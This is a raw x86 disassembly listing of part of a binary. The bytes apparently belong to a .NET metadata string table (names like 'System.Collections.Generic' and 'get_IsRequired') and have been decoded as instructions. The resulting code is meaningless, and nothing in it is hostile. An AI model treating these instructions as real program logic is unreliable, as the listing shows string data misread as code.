  407adc:	imul   esp,DWORD PTR [edx+0x75],0x4f006574
  407ae3:	bound  ebp,QWORD PTR [edx+0x65]
  407ae6:	arpl   WORD PTR [eax+eax*1+0x56],si
  407aea:	popa   
  407aeb:	ins    BYTE PTR es:[edi],dx
  407aec:	jne    0x407b53
  407aee:	push   esp
  407aef:	jns    0x407b61
  407af1:	add    BYTE PTR gs:[ebp+0x6e],al
  407af5:	jne    0x407b64
  407af7:	add    BYTE PTR [ebx+0x79],dl
  407afa:	jae    0x407b70
  407afc:	gs ins DWORD PTR es:[edi],dx
  407afe:	cs inc ebx
  407b00:	outs   dx,DWORD PTR ds:[esi]
  407b01:	ins    BYTE PTR es:[edi],dx
  407b02:	ins    BYTE PTR es:[edi],dx
  407b03:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407b08:	outs   dx,BYTE PTR ds:[esi]
  407b09:	jae    0x407b39
  407b0b:	inc    edi
  407b0c:	outs   dx,BYTE PTR gs:[esi]
  407b0e:	gs jb  0x407b7a
  407b11:	arpl   WORD PTR [eax],ax
  407b13:	dec    ecx
  407b14:	inc    ebx
  407b15:	outs   dx,DWORD PTR ds:[esi]
  407b16:	ins    BYTE PTR es:[edi],dx
  407b17:	ins    BYTE PTR es:[edi],dx
  407b18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407b1d:	outs   dx,BYTE PTR ds:[esi]
  407b1e:	pusha  
  407b1f:	xor    DWORD PTR [eax],eax
  407b21:	dec    ecx
  407b22:	inc    ebp
  407b23:	outs   dx,BYTE PTR ds:[esi]
  407b24:	jne    0x407b93
  407b26:	gs jb  0x407b8a
  407b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  407b2d:	xor    DWORD PTR [eax],eax
  407b2f:	push   ebx
  407b30:	jns    0x407ba5
  407b32:	je     0x407b99
  407b34:	ins    DWORD PTR es:[edi],dx
  407b35:	cs inc ebx
  407b37:	outs   dx,DWORD PTR ds:[esi]
  407b38:	ins    BYTE PTR es:[edi],dx
  407b39:	ins    BYTE PTR es:[edi],dx
  407b3a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407b3f:	outs   dx,BYTE PTR ds:[esi]
  407b40:	jae    0x407b42
  407b42:	dec    ecx
  407b43:	inc    ebp
  407b44:	outs   dx,BYTE PTR ds:[esi]
  407b45:	jne    0x407bb4
  407b47:	gs jb  0x407bab
  407b4a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  407b4e:	inc    ebp
  407b4f:	js     0x407bb4
  407b51:	gs jo  0x407bc8
  407b54:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  407b5b:	je     0x407bc2
  407b5d:	ins    DWORD PTR es:[edi],dx
  407b5e:	cs inc ebx
  407b60:	outs   dx,DWORD PTR ds:[esi]
  407b61:	ins    DWORD PTR es:[edi],dx
  407b62:	jo     0x407bd3
  407b64:	outs   dx,BYTE PTR ds:[esi]
  407b65:	outs   dx,BYTE PTR gs:[esi]
  407b67:	je     0x407bb6
  407b69:	outs   dx,DWORD PTR ds:[esi]
  407b6a:	fs gs ins BYTE PTR es:[edi],dx
  407b6d:	add    BYTE PTR [ebp+eiz*2+0x73],al
  407b71:	arpl   WORD PTR [edx+0x69],si
  407b74:	jo     0x407bea
  407b76:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407b7d:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  407b84:	popa   
  407b85:	je     0x407bec
  407b87:	outs   dx,DWORD PTR ds:[si]
  407b89:	jb     0x407c04
  407b8b:	inc    ecx
  407b8c:	je     0x407c02
  407b8e:	jb     0x407bf9
  407b90:	bound  esi,QWORD PTR [ebp+0x74]
  407b93:	add    BYTE PTR gs:[edi+0x6e],bl
  407b97:	popa   
  407b98:	ins    DWORD PTR es:[edi],dx
  407b99:	add    BYTE PTR gs:[edi+0x73],bl
  407b9d:	push   0x4674726f
  407ba2:	outs   dx,DWORD PTR ds:[esi]
  407ba3:	jb     0x407c12
  407ba5:	add    BYTE PTR [edi+0x64],bl
  407ba8:	gs jae 0x407c0e
  407bab:	jb     0x407c16
  407bad:	jo     0x407c23
  407baf:	imul   ebp,DWORD PTR [edi+0x6e],0x61765f00
  407bb6:	ins    BYTE PTR es:[edi],dx
  407bb7:	jne    0x407c1e
  407bb9:	dec    esi
  407bba:	popa   
  407bbb:	ins    DWORD PTR es:[edi],dx
  407bbc:	add    BYTE PTR gs:[edi+0x69],bl
  407bc0:	jae    0x407c14
  407bc2:	gs jno 0x407c3a
  407bc5:	imul   esi,DWORD PTR [edx+0x65],0x695f0064
  407bcc:	jae    0x407c21
  407bce:	ja     0x407c39
  407bd0:	je     0x407c35
  407bd2:	push   0x796c6e4f
  407bd7:	add    BYTE PTR [edi+0x76],bl
  407bda:	popa   
  407bdb:	ins    BYTE PTR es:[edi],dx
  407bdc:	jne    0x407c43
  407bde:	push   edi
  407bdf:	push   0x77536e65
  407be4:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x72507349
  407bec:	gs jae 0x407c54
  407bef:	outs   dx,BYTE PTR ds:[esi]
  407bf0:	je     0x407bf2
  407bf2:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  407bf7:	add    BYTE PTR [ecx+0x6e],cl
  407bfa:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  407c02:	add    BYTE PTR [edi+0x65],ah
  407c05:	je     0x407c66
  407c07:	dec    esi
  407c08:	popa   
  407c09:	ins    DWORD PTR es:[edi],dx
  407c0a:	add    BYTE PTR gs:[edi+0x65],ah
  407c0e:	je     0x407c6f
  407c10:	push   ebx
  407c11:	push   0x4674726f
  407c16:	outs   dx,DWORD PTR ds:[esi]
  407c17:	jb     0x407c86
  407c19:	add    BYTE PTR [edi+0x65],ah
  407c1c:	je     0x407c7d
  407c1e:	inc    esp
  407c1f:	gs jae 0x407c85
  407c22:	jb     0x407c8d
  407c24:	jo     0x407c9a
  407c26:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  407c2d:	pop    edi
  407c2e:	dec    ecx
  407c2f:	jae    0x407c83
  407c31:	gs jno 0x407ca9
  407c34:	imul   esi,DWORD PTR [edx+0x65],0x65670064
  407c3b:	je     0x407c9c
  407c3d:	dec    ecx
  407c3e:	jae    0x407c93
  407c40:	ja     0x407cab
  407c42:	je     0x407ca7
  407c44:	push   0x796c6e4f
  407c49:	add    BYTE PTR [edi+0x65],ah
  407c4c:	je     0x407cad
  407c4e:	push   esi
  407c4f:	popa   
  407c50:	ins    BYTE PTR es:[edi],dx
  407c51:	jne    0x407cb8
  407c53:	push   edi
  407c54:	push   0x77536e65
  407c59:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x72507349
  407c61:	gs jae 0x407cc9
  407c64:	outs   dx,BYTE PTR ds:[esi]
  407c65:	je     0x407c67
  407c67:	addr16 gs je 0x407cca
  407c6b:	push   esi
  407c6c:	popa   
  407c6d:	ins    BYTE PTR es:[edi],dx
  407c6e:	jne    0x407cd5
  407c70:	dec    esi
  407c71:	popa   
  407c72:	ins    DWORD PTR es:[edi],dx
  407c73:	add    BYTE PTR gs:[esi+0x61],cl
  407c77:	ins    DWORD PTR es:[edi],dx
  407c78:	add    BYTE PTR gs:[ebx+0x68],dl
  407c7c:	outs   dx,DWORD PTR ds:[esi]
  407c7d:	jb     0x407cf3
  407c7f:	inc    esi
  407c80:	outs   dx,DWORD PTR ds:[esi]
  407c81:	jb     0x407cf0
  407c83:	add    BYTE PTR [ebp+eiz*2+0x73],al
  407c87:	arpl   WORD PTR [edx+0x69],si
  407c8a:	jo     0x407d00
  407c8c:	imul   ebp,DWORD PTR [edi+0x6e],0x52734900
  407c93:	gs jno 0x407d0b
  407c96:	imul   esi,DWORD PTR [edx+0x65],0x73490064
  407c9d:	push   ebx
  407c9e:	ja     0x407d09
  407ca0:	je     0x407d05
  407ca2:	push   0x796c6e4f
  407ca7:	add    BYTE PTR [esi+0x61],dl
  407caa:	ins    BYTE PTR es:[edi],dx
  407cab:	jne    0x407d12
  407cad:	push   edi
  407cae:	push   0x77536e65
  407cb3:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x72507349
  407cbb:	gs jae 0x407d23
  407cbe:	outs   dx,BYTE PTR ds:[esi]
  407cbf:	je     0x407cc1
  407cc1:	push   esi
  407cc2:	popa   
  407cc3:	ins    BYTE PTR es:[edi],dx
  407cc4:	jne    0x407d2b
  407cc6:	dec    esi
  407cc7:	popa   
  407cc8:	ins    DWORD PTR es:[edi],dx
  407cc9:	add    BYTE PTR gs:[esi+0x65],dl
  407ccd:	jb     0x407d42
  407ccf:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4431
  407cd6:	xor    BYTE PTR [eax],al
  407cd8:	push   esi
  407cd9:	gs jb  0x407d4f
  407cdc:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4432
  407ce3:	xor    BYTE PTR [eax],al
  407ce5:	push   ebx
  407ce6:	jns    0x407d5b
  407ce8:	je     0x407d4f
  407cea:	ins    DWORD PTR es:[edi],dx
  407ceb:	cs push edx
  407ced:	gs data16 ins BYTE PTR es:[edi],dx
  407cf0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407cf5:	outs   dx,BYTE PTR ds:[esi]
  407cf6:	add    BYTE PTR [eax+0x72],dl
  407cf9:	outs   dx,DWORD PTR ds:[esi]
  407cfa:	jo     0x407d61
  407cfc:	jb     0x407d72
  407cfe:	jns    0x407d49
  407d00:	outs   dx,BYTE PTR ds:[esi]
  407d01:	outs   dx,WORD PTR ds:[esi]
  407d03:	add    BYTE PTR [edi+0x70],bl
  407d06:	jb     0x407d77
  407d08:	jo     0x407d6f
  407d0a:	jb     0x407d80
  407d0c:	jns    0x407d57
  407d0e:	outs   dx,BYTE PTR ds:[esi]
  407d0f:	outs   dx,WORD PTR ds:[esi]
  407d11:	add    BYTE PTR [edi+0x61],bl
  407d14:	jb     0x407d7d
  407d16:	jne    0x407d85
  407d18:	outs   dx,BYTE PTR gs:[esi]
  407d1a:	je     0x407d5d
  407d1c:	je     0x407d92
  407d1e:	jb     0x407d89
  407d20:	bound  esi,QWORD PTR [ebp+0x74]
  407d23:	add    BYTE PTR gs:[edi+0x69],bl
  407d27:	outs   dx,BYTE PTR ds:[esi]
  407d28:	jae    0x407d9e
  407d2a:	popa   
  407d2b:	outs   dx,BYTE PTR ds:[esi]
  407d2c:	arpl   WORD PTR [ebp+0x0],sp
  407d2f:	push   ebx
  407d30:	outs   dx,DWORD PTR ds:[esi]
  407d31:	jb     0x407da7
  407d33:	gs fs dec esp
  407d36:	imul   esi,DWORD PTR [ebx+0x74],0x5f003260
  407d3d:	outs   dx,BYTE PTR gs:[esi]
  407d3f:	jne    0x407dae
  407d41:	gs jb  0x407da5
  407d44:	je     0x407daf
  407d46:	outs   dx,DWORD PTR ds:[esi]
  407d47:	outs   dx,BYTE PTR ds:[esi]
  407d48:	inc    esp
  407d49:	gs jae 0x407daf
  407d4c:	jb     0x407db7
  407d4e:	jo     0x407dc4
  407d50:	imul   ebp,DWORD PTR [edi+0x6e],0x65670073
  407d57:	je     0x407db8
  407d59:	dec    eax
  407d5a:	popa   
  407d5b:	jae    0x407db3
  407d5d:	popa   
  407d5e:	ins    BYTE PTR es:[edi],dx
  407d5f:	jne    0x407dc6
  407d61:	add    BYTE PTR [ebx+0x65],dl
  407d64:	je     0x407dbc
  407d66:	popa   
  407d67:	ins    BYTE PTR es:[edi],dx
  407d68:	jne    0x407dcf
  407d6a:	add    BYTE PTR [edi+0x65],al
  407d6d:	je     0x407dc5
  407d6f:	popa   
  407d70:	ins    BYTE PTR es:[edi],dx
  407d71:	jne    0x407dd8
  407d73:	inc    ecx
  407d74:	jae    0x407dc5
  407d76:	bound  ebp,QWORD PTR [edx+0x65]
  407d79:	arpl   WORD PTR [eax+eax*1+0x47],si
  407d7d:	gs je  0x407dc7
  407d80:	outs   dx,BYTE PTR gs:[esi]
  407d82:	gs jb  0x407de6
  407d85:	je     0x407dec
  407d87:	fs inc ebx
  407d89:	outs   dx,DWORD PTR ds:[esi]
  407d8a:	fs gs push esi
  407d8d:	gs jb  0x407e03
  407d90:	imul   ebp,DWORD PTR [edi+0x6e],0x756c6156
  407d97:	add    BYTE PTR gs:[edi+0x65],al
  407d9b:	je     0x407de2
  407d9d:	outs   dx,BYTE PTR ds:[esi]
  407d9e:	jne    0x407e0d
  407da0:	dec    esi
  407da1:	popa   
  407da2:	ins    DWORD PTR es:[edi],dx
  407da3:	gs push ebx
  407da5:	je     0x407e19
  407da7:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  407dae:	pop    edi
  407daf:	dec    ecx
  407db0:	outs   dx,BYTE PTR ds:[esi]
  407db1:	jae    0x407e27
  407db3:	popa   
  407db4:	outs   dx,BYTE PTR ds:[esi]
  407db5:	arpl   WORD PTR [ebp+0x0],sp
  407db8:	addr16 gs je 0x407e1b
  407dbc:	push   eax
  407dbd:	jb     0x407e2e
  407dbf:	jo     0x407e26
  407dc1:	jb     0x407e37
  407dc3:	jns    0x407e0e
  407dc5:	outs   dx,BYTE PTR ds:[esi]
  407dc6:	outs   dx,WORD PTR ds:[esi]
  407dc8:	add    BYTE PTR [ecx+edi*2+0x70],dl
  407dcc:	add    BYTE PTR gs:[edi+0x65],ah
  407dd0:	je     0x407e31
  407dd2:	push   eax
  407dd3:	jb     0x407e44
  407dd5:	jo     0x407e3c
  407dd7:	jb     0x407e4d
  407dd9:	jns    0x407e2f
  407ddb:	jns    0x407e4d
  407ddd:	add    BYTE PTR gs:[edi+0x65],ah
  407de1:	je     0x407e42
  407de3:	inc    ebp
  407de4:	outs   dx,BYTE PTR ds:[esi]
  407de5:	jne    0x407e54
  407de7:	gs jb  0x407e4b
  407dea:	je     0x407e55
  407dec:	outs   dx,DWORD PTR ds:[esi]
  407ded:	outs   dx,BYTE PTR ds:[esi]
  407dee:	inc    esp
  407def:	gs jae 0x407e55
  407df2:	jb     0x407e5d
  407df4:	jo     0x407e6a
  407df6:	imul   ebp,DWORD PTR [edi+0x6e],0x72430073
  407dfd:	gs popa 
  407dff:	je     0x407e66
  407e01:	add    BYTE PTR [eax+0x61],cl
  407e04:	jae    0x407e5c
  407e06:	popa   
  407e07:	ins    BYTE PTR es:[edi],dx
  407e08:	jne    0x407e6f
  407e0a:	add    BYTE PTR [ecx+0x6e],cl
  407e0d:	jae    0x407e83
  407e0f:	popa   
  407e10:	outs   dx,BYTE PTR ds:[esi]
  407e11:	arpl   WORD PTR [ebp+0x0],sp
  407e14:	push   eax
  407e15:	jb     0x407e86
  407e17:	jo     0x407e7e
  407e19:	jb     0x407e8f
  407e1b:	jns    0x407e71
  407e1d:	jns    0x407e8f
  407e1f:	add    BYTE PTR gs:[ebp+0x6e],al
  407e23:	jne    0x407e92
  407e25:	gs jb  0x407e89
  407e28:	je     0x407e93
  407e2a:	outs   dx,DWORD PTR ds:[esi]
  407e2b:	outs   dx,BYTE PTR ds:[esi]
  407e2c:	inc    esp
  407e2d:	gs jae 0x407e93
  407e30:	jb     0x407e9b
  407e32:	jo     0x407ea8
  407e34:	imul   ebp,DWORD PTR [edi+0x6e],0x52410073
  407e3b:	inc    edi
  407e3c:	pop    edi
  407e3d:	dec    esi
  407e3e:	dec    edi
  407e3f:	dec    esp
  407e40:	dec    edi
  407e41:	inc    edi
  407e42:	dec    edi
  407e43:	pop    edi
  407e44:	xor    DWORD PTR [eax],eax
  407e46:	inc    ecx
  407e47:	push   edx
  407e48:	inc    edi
  407e49:	pop    edi
  407e4a:	dec    esi
  407e4b:	dec    edi
  407e4c:	dec    esp
  407e4d:	dec    edi
  407e4e:	inc    edi
  407e4f:	dec    edi
  407e50:	pop    edi
  407e51:	xor    al,BYTE PTR [eax]
  407e53:	inc    esp
  407e54:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  407e5b:	jb     0x407ed6
  407e5d:	pusha  
  407e5e:	xor    al,BYTE PTR [eax]
  407e60:	pop    edi
  407e61:	popa   
  407e62:	jb     0x407ecb
  407e64:	jne    0x407ed3
  407e66:	outs   dx,BYTE PTR gs:[esi]
  407e68:	je     0x407eba
  407e6a:	jb     0x407edb
  407e6c:	jo     0x407ed3
  407e6e:	jb     0x407ee4
  407e70:	imul   esp,DWORD PTR [ebp+0x73],0x68735f00
  407e77:	outs   dx,DWORD PTR ds:[esi]
  407e78:	ja     0x407ecf
  407e7a:	jae    0x407edd
  407e7c:	add    BYTE PTR gs:[bx+0x6e],bl
  407e81:	outs   dx,DWORD PTR ds:[esi]
  407e82:	dec    esp
  407e83:	outs   dx,DWORD PTR ds:[esi]
  407e84:	outs   dx,DWORD PTR ds:[si]
  407e86:	add    BYTE PTR [eax+0x61],dl
  407e89:	jb     0x407efe
  407e8b:	add    BYTE PTR gs:[edi+0x65],al
  407e8f:	je     0x407edf
  407e91:	outs   dx,DWORD PTR ds:[esi]
  407e92:	dec    esp
  407e93:	outs   dx,DWORD PTR ds:[esi]
  407e94:	outs   dx,DWORD PTR ds:[si]
  407e96:	inc    ecx
  407e97:	jb     0x407f00
  407e99:	jne    0x407f08
  407e9b:	outs   dx,BYTE PTR gs:[esi]
  407e9d:	je     0x407ef5
  407e9f:	popa   
  407ea0:	ins    BYTE PTR es:[edi],dx
  407ea1:	jne    0x407f08
  407ea3:	add    BYTE PTR [ecx+ebp*2+0x73],al
  407ea7:	jo     0x407f15
  407ea9:	popa   
  407eaa:	jns    0x407ef8
  407eac:	outs   dx,DWORD PTR ds:[esi]
  407ead:	outs   dx,DWORD PTR ds:[si]
  407eaf:	add    BYTE PTR [edi+0x65],al
  407eb2:	je     0x407f09
  407eb4:	jae    0x407f17
  407eb6:	addr16 gs inc ebp
  407eb9:	js     0x407f1c
  407ebb:	ins    DWORD PTR es:[edi],dx
  407ebc:	jo     0x407f2a
  407ebe:	gs jae 0x407ec1
  407ec1:	push   ebx
  407ec2:	jo     0x407f30
  407ec4:	imul   esi,DWORD PTR [esi+ecx*2+0x61],0x6e41656d
  407ecc:	fs push esi
  407ece:	popa   
  407ecf:	ins    BYTE PTR es:[edi],dx
  407ed0:	jne    0x407f37
  407ed2:	add    BYTE PTR [edi+0x65],ah
  407ed5:	je     0x407f36
  407ed7:	inc    ecx
  407ed8:	jb     0x407f41
  407eda:	jne    0x407f49
  407edc:	outs   dx,BYTE PTR gs:[esi]
  407ede:	je     0x407f30
  407ee0:	jb     0x407f51
  407ee2:	jo     0x407f49
  407ee4:	jb     0x407f5a
  407ee6:	imul   esp,DWORD PTR [ebp+0x73],0x74656700
  407eed:	pop    edi
  407eee:	dec    eax
  407eef:	gs ins BYTE PTR es:[edi],dx
  407ef1:	jo     0x407ef3
  407ef3:	jae    0x407f5a
  407ef5:	je     0x407f56
  407ef7:	dec    eax
  407ef8:	gs ins BYTE PTR es:[edi],dx
  407efa:	jo     0x407efc
  407efc:	addr16 gs je 0x407f5f
  407f00:	dec    esi
  407f01:	outs   dx,DWORD PTR ds:[esi]
  407f02:	dec    esp
  407f03:	outs   dx,DWORD PTR ds:[esi]
  407f04:	outs   dx,DWORD PTR ds:[si]
  407f06:	add    BYTE PTR [ebx+0x65],dh
  407f09:	je     0x407f6a
  407f0b:	dec    esi
  407f0c:	outs   dx,DWORD PTR ds:[esi]
  407f0d:	dec    esp
  407f0e:	outs   dx,DWORD PTR ds:[esi]
  407f0f:	outs   dx,DWORD PTR ds:[si]
  407f11:	add    BYTE PTR [ebx+0x68],dl
  407f14:	outs   dx,DWORD PTR ds:[esi]
  407f15:	ja     0x407f6c
  407f17:	jae    0x407f7a
  407f19:	add    BYTE PTR gs:[bx+0x65],al
  407f1e:	je     0x407f75
  407f20:	jae    0x407f83
  407f22:	addr16 gs push esp
  407f25:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x73694c00
  407f2d:	je     0x407f8f
  407f2f:	xor    DWORD PTR [eax],eax
  407f31:	dec    ebx
  407f32:	gs jns 0x407f8b
  407f35:	popa   
  407f36:	ins    BYTE PTR es:[edi],dx
  407f37:	jne    0x407f9e
  407f39:	push   eax
  407f3a:	popa   
  407f3b:	imul   esi,DWORD PTR [edx+0x60],0x69440032
  407f42:	jae    0x407fb4
  407f44:	ins    BYTE PTR es:[edi],dx
  407f45:	popa   
  407f46:	jns    0x407f48
  407f48:	inc    esp
  407f49:	imul   esi,DWORD PTR [ebx+0x70],0x5779616c
  407f50:	jb     0x407fb3
  407f52:	jo     0x407fc4
  407f54:	gs fs dec ebp
  407f57:	gs jae 0x407fcd
  407f5a:	popa   
  407f5b:	add    BYTE PTR gs:[si+0x69],al
  407f60:	jae    0x407fd2
  407f62:	ins    BYTE PTR es:[edi],dx
  407f63:	popa   
  407f64:	jns    0x407fa9
  407f66:	outs   dx,BYTE PTR gs:[esi]
  407f68:	je     0x407fcf
  407f6a:	jb     0x407fd1
  407f6c:	add    BYTE PTR fs:[edi+0x65],al
  407f70:	je     0x407fb7
  407f72:	js     0x407fd9
  407f74:	dec    esi
  407f75:	popa   
  407f76:	ins    DWORD PTR es:[edi],dx
  407f77:	add    BYTE PTR gs:[edi+0x65],al
  407f7b:	je     0x407fc2
  407f7d:	js     0x407fe4
  407f7f:	push   esi
  407f80:	gs jb  0x407ff6
  407f83:	imul   ebp,DWORD PTR [edi+0x6e],0x66615300
  407f8a:	gs inc edi
  407f8c:	gs je  0x407fd2
  407f8f:	outs   dx,DWORD PTR ds:[esi]
  407f90:	outs   dx,BYTE PTR ds:[esi]
  407f91:	jae    0x408002
  407f93:	ins    BYTE PTR es:[edi],dx
  407f94:	gs inc edx
  407f96:	jne    0x407ffe
  407f98:	data16 gs jb 0x407ff3
  407f9c:	imul   esp,DWORD PTR [esp+esi*2+0x68],0x67724100
  407fa4:	jne    0x408013
  407fa6:	outs   dx,BYTE PTR gs:[esi]
  407fa8:	je     0x407ffa
  407faa:	jb     0x40801b
  407fac:	jo     0x408013
  407fae:	jb     0x408024
  407fb0:	imul   esp,DWORD PTR [ebp+0x73],0x6c654800
  407fb7:	jo     0x407fb9
  407fb9:	dec    esi
  407fba:	outs   dx,DWORD PTR ds:[esi]
  407fbb:	dec    esp
  407fbc:	outs   dx,DWORD PTR ds:[esi]
  407fbd:	outs   dx,DWORD PTR ds:[si]
  407fbf:	add    BYTE PTR [edi+0x65],bl
  407fc2:	outs   dx,BYTE PTR ds:[esi]
  407fc3:	jne    0x408032
  407fc5:	push   esi
  407fc6:	popa   
  407fc7:	ins    BYTE PTR es:[edi],dx
  407fc8:	jne    0x40802f
  407fca:	add    BYTE PTR [edi+0x6f],bl
  407fcd:	jb     0x408033
  407fcf:	imul   ebp,DWORD PTR [esi+0x61],0x735f006c
  407fd6:	je     0x40804a
  407fd8:	imul   ebp,DWORD PTR [esi+0x67],0x756c6156
  407fdf:	add    BYTE PTR gs:[edi+0x65],ah
  407fe3:	je     0x408044
  407fe5:	dec    edi
  407fe6:	jb     0x40804c
  407fe8:	imul   ebp,DWORD PTR [esi+0x61],0x6567006c
  407fef:	je     0x408050
  407ff1:	inc    ebp
  407ff2:	outs   dx,BYTE PTR ds:[esi]
  407ff3:	jne    0x408062
  407ff5:	push   esi
  407ff6:	popa   
  407ff7:	ins    BYTE PTR es:[edi],dx
  407ff8:	jne    0x40805f
  407ffa:	add    BYTE PTR [edi+0x72],cl
  407ffd:	imul   ebp,DWORD PTR fs:[esi+0x61],0x6e45006c
  408005:	jne    0x408074
  408007:	push   esi
  408008:	popa   
  408009:	ins    BYTE PTR es:[edi],dx
  40800a:	jne    0x408071
  40800c:	add    BYTE PTR [edi+0x73],bl
  40800f:	outs   dx,DWORD PTR ds:[esi]
  408010:	jne    0x408084
  408012:	arpl   WORD PTR [ebp+0x0],sp
  408015:	pop    edi
  408016:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  40801a:	outs   dx,BYTE PTR ds:[esi]
  40801b:	push   edi
  40801c:	jb     0x40807f
  40801e:	jo     0x408020
  408020:	pop    edi
  408021:	jae    0x408088
  408023:	ins    DWORD PTR es:[di],dx
  408025:	outs   dx,BYTE PTR gs:[esi]
  408027:	je     0x40809c
  408029:	add    BYTE PTR [edi+ebp*2+0x57],al
  40802d:	jb     0x408090
  40802f:	jo     0x408031
  408031:	addr16 gs je 0x408094
  408035:	inc    ebx
  408036:	ins    BYTE PTR es:[edi],dx
  408037:	gs popa 
  408039:	outs   dx,BYTE PTR ds:[esi]
  40803a:	push   edi
  40803b:	jb     0x40809e
  40803d:	jo     0x40803f
  40803f:	addr16 gs je 0x4080a2
  408043:	push   ebx
  408044:	outs   dx,DWORD PTR ds:[esi]
  408045:	jne    0x4080b9
  408047:	arpl   WORD PTR [ebp+0x0],sp
  40804a:	addr16 gs je 0x4080ad
  40804e:	inc    ebx
  40804f:	outs   dx,DWORD PTR ds:[esi]
  408050:	jne    0x4080c0
  408052:	je     0x408054
  408054:	addr16 gs je 0x4080b7
  408058:	dec    ecx
  408059:	je     0x4080c0
  40805b:	ins    DWORD PTR es:[edi],dx
  40805c:	add    BYTE PTR [ebx+0x6f],al
  40805f:	ins    BYTE PTR es:[edi],dx
  408060:	ins    BYTE PTR es:[edi],dx
  408061:	popa   
  408062:	jo     0x4080d7
  408064:	gs push edi
  408066:	push   0x73657469
  40806b:	jo     0x4080ce
  40806d:	arpl   WORD PTR [ebp+0x0],sp
  408070:	inc    ebx
  408071:	ins    BYTE PTR es:[edi],dx
  408072:	gs popa 
  408074:	outs   dx,BYTE PTR ds:[esi]
  408075:	push   edi
  408076:	jb     0x4080d9
  408078:	jo     0x40807a
  40807a:	push   ebx
  40807b:	outs   dx,DWORD PTR ds:[esi]
  40807c:	jne    0x4080f0
  40807e:	arpl   WORD PTR [ebp+0x0],sp
  408081:	inc    ebx
  408082:	outs   dx,DWORD PTR ds:[esi]
  408083:	jne    0x4080f3
  408085:	je     0x408087
  408087:	dec    ecx
  408088:	je     0x4080ef
  40808a:	ins    DWORD PTR es:[edi],dx
  40808b:	add    BYTE PTR [edi+0x73],bl
  40808e:	je     0x4080f1
  408090:	jb     0x408106
  408092:	dec    ecx
  408093:	outs   dx,BYTE PTR ds:[esi]
  408094:	fs gs js 0x408098
  408098:	pop    edi
  408099:	outs   dx,BYTE PTR gs:[esi]
  40809b:	fs dec ecx
  40809d:	outs   dx,BYTE PTR ds:[esi]
  40809e:	fs gs js 0x4080a2
  4080a2:	addr16 gs je 0x408105
  4080a6:	push   ebx
  4080a7:	je     0x40810a
  4080a9:	jb     0x40811f
  4080ab:	dec    ecx
  4080ac:	outs   dx,BYTE PTR ds:[esi]
  4080ad:	fs gs js 0x4080b1
  4080b1:	addr16 gs je 0x408114
  4080b5:	inc    ebp
  4080b6:	outs   dx,BYTE PTR ds:[esi]
  4080b7:	fs dec ecx
  4080b9:	outs   dx,BYTE PTR ds:[esi]
  4080ba:	fs gs js 0x4080be
  4080be:	addr16 gs je 0x408121
  4080c2:	dec    esp
  4080c3:	outs   dx,BYTE PTR gs:[esi]
  4080c5:	addr16 je 0x408130
  4080c8:	add    BYTE PTR [ebx+0x74],dl
  4080cb:	popa   
  4080cc:	jb     0x408142
  4080ce:	dec    ecx
  4080cf:	outs   dx,BYTE PTR ds:[esi]
  4080d0:	fs gs js 0x4080d4
  4080d4:	inc    ebp
  4080d5:	outs   dx,BYTE PTR ds:[esi]
  4080d6:	fs dec ecx
  4080d8:	outs   dx,BYTE PTR ds:[esi]
  4080d9:	fs gs js 0x4080dd
  4080dd:	dec    esp
  4080de:	outs   dx,BYTE PTR gs:[esi]
  4080e0:	addr16 je 0x40814b
  4080e3:	add    BYTE PTR [esi+0x61],dh
  4080e6:	ins    BYTE PTR es:[edi],dx
  4080e7:	jne    0x40814e
  4080e9:	pop    edi
  4080ea:	pop    edi
  4080eb:	add    BYTE PTR [esi+0x6f],cl
  4080ee:	jb     0x40815d
  4080f0:	popa   
  4080f1:	ins    BYTE PTR es:[edi],dx
  4080f2:	add    BYTE PTR [ebx+0x79],dl
  4080f5:	jae    0x40816b
  4080f7:	gs ins DWORD PTR es:[edi],dx
  4080f9:	cs inc ebx
  4080fb:	outs   dx,DWORD PTR ds:[esi]
  4080fc:	jb     0x408163
  4080fe:	add    BYTE PTR [esi+0x75],al
  408101:	outs   dx,BYTE PTR ds:[esi]
  408102:	arpl   WORD PTR [eax+0x32],sp
  408105:	add    BYTE PTR [edi+0x65],bl
  408108:	js     0x40816b
  40810a:	ins    DWORD PTR es:[edi],dx
  40810b:	jo     0x408179
  40810d:	add    BYTE PTR gs:[edi+0x65],ah
  408111:	je     0x408172
  408113:	inc    ebp
  408114:	js     0x408177
  408116:	ins    DWORD PTR es:[edi],dx
  408117:	jo     0x408185
  408119:	add    BYTE PTR gs:[ebp+0x78],al
  40811d:	popa   
  40811e:	ins    DWORD PTR es:[edi],dx
  40811f:	jo     0x40818d
  408121:	add    BYTE PTR gs:[esi+0x42],dl
  408125:	add    BYTE PTR [ebx+0x53],al
  408128:	push   0x707261
  40812d:	pop    edi
  40812e:	gs js  0x4081a1
  408131:	popa   
  408132:	outs   dx,BYTE PTR ds:[esi]
  408133:	fs gs fs push eax
  408137:	popa   
  408138:	je     0x4081a2
  40813a:	jae    0x40813c
  40813c:	pop    edi
  40813d:	popa   
  40813e:	jb     0x4081a7
  408140:	jne    0x4081af
  408142:	outs   dx,BYTE PTR gs:[esi]
  408144:	je     0x408194
  408146:	popa   
  408147:	ins    DWORD PTR es:[edi],dx
  408148:	add    BYTE PTR gs:[edi+0x65],bl
  40814c:	js     0x4081be
  40814e:	popa   
  40814f:	outs   dx,BYTE PTR ds:[esi]
  408150:	jae    0x4081bb
  408152:	outs   dx,DWORD PTR ds:[esi]
